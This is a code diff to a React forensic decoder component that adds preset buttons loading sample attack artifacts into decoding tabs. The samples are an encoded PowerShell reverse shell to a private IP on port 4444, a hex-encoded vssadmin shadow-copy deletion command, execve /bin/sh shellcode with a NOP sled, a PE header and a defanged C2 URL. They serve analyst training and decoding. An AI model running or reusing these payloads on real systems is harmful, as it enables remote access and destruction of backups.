@@ -161,45 +161,69 @@ export const ForensicDecoders: React.FC = () => {
       </div>
 
       {/* Preset Quick Loader Buttons */}
-      <div className="flex flex-wrap items-center gap-2 text-xs font-mono bg-slate-900/60 border border-slate-800/80 p-3 rounded-xl">
-        <span className="text-slate-400 flex items-center gap-1.5 pr-2 border-r border-slate-800">
-          <Cpu className="w-3.5 h-3.5 text-cyan-400" /> Presets:
+      <div className="flex flex-wrap items-center gap-2 text-xs font-mono bg-slate-900/90 border border-slate-800 p-3.5 rounded-xl">
+        <span className="text-slate-300 font-bold flex items-center gap-1.5 pr-2 border-r border-slate-800">
+          <Flame className="w-3.5 h-3.5 text-rose-500" /> High-Risk Artifacts:
         </span>
         <button
           onClick={() => {
             setInputPayload('powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADQANAApAA==');
             setActiveTab('deobfuscator');
           }}
-          className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-cyan-300 border border-slate-700 transition"
+          className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-cyan-300 border border-slate-700 transition flex items-center gap-1.5"
         >
-          PowerShell Reverse Shell (-Enc)
+          <span className="w-1.5 h-1.5 rounded-full bg-rose-500"></span>
+          <span>PowerShell Reverse Shell (-Enc)</span>
+        </button>
+        <button
+          onClick={() => {
+            setInputPayload('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGU=');
+            setActiveTab('base64');
+          }}
+          className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-indigo-300 border border-slate-700 transition flex items-center gap-1.5"
+        >
+          <span className="w-1.5 h-1.5 rounded-full bg-rose-500"></span>
+          <span>PE Executable Header (Base64)</span>
         </button>
         <button
           onClick={() => {
             setInputPayload('76 73 73 61 64 6d 69 6e 20 64 65 6c 65 74 65 20 73 68 61 64 6f 77 73 20 2f 61 6c 6c 20 2f 71 75 69 65 74');
             setActiveTab('hex');
           }}
-          className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-amber-300 border border-slate-700 transition"
+          className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-amber-300 border border-slate-700 transition flex items-center gap-1.5"
         >
-          Ransomware Command (Hex)
+          <span className="w-1.5 h-1.5 rounded-full bg-rose-500"></span>
+          <span>Ransomware vssadmin (Hex)</span>
         </button>
         <button
           onClick={() => {
-            setInputPayload('hxxps://malicious-bank-login[.]ru/auth/login.php?user=victim[@]corp[.]com');
+            setInputPayload('90 90 90 90 31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 50 53 89 e1 99 b0 0b cd 80');
+            setActiveTab('hex');
+          }}
+          className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-red-300 border border-slate-700 transition flex items-center gap-1.5"
+        >
+          <span className="w-1.5 h-1.5 rounded-full bg-rose-500"></span>
+          <span>Shellcode NOP Sled (Hex)</span>
+        </button>
+        <button
+          onClick={() => {
+            setInputPayload('hxxps://malicious-c2-gateway[.]top:4444/payload[.]exe?user=admin[@]bank[.]com');
             setActiveTab('defanger');
           }}
-          className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-purple-300 border border-slate-700 transition"
+          className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-purple-300 border border-slate-700 transition flex items-center gap-1.5"
         >
-          Defanged Phishing Indicator
+          <span className="w-1.5 h-1.5 rounded-full bg-amber-500"></span>
+          <span>Live C2 Threat URL (Defanger)</span>
         </button>
         <button
           onClick={() => {
             setInputPayload('4b 4f 43 4b 42 49 54 20 4c 4f 43 4b 45 44');
             setActiveTab('xor');
           }}
-          className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-emerald-300 border border-slate-700 transition"
+          className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-emerald-300 border border-slate-700 transition flex items-center gap-1.5"
         >
-          XOR Encrypted String
+          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>
+          <span>XOR Encrypted C2 Key</span>
         </button>
       </div>
 
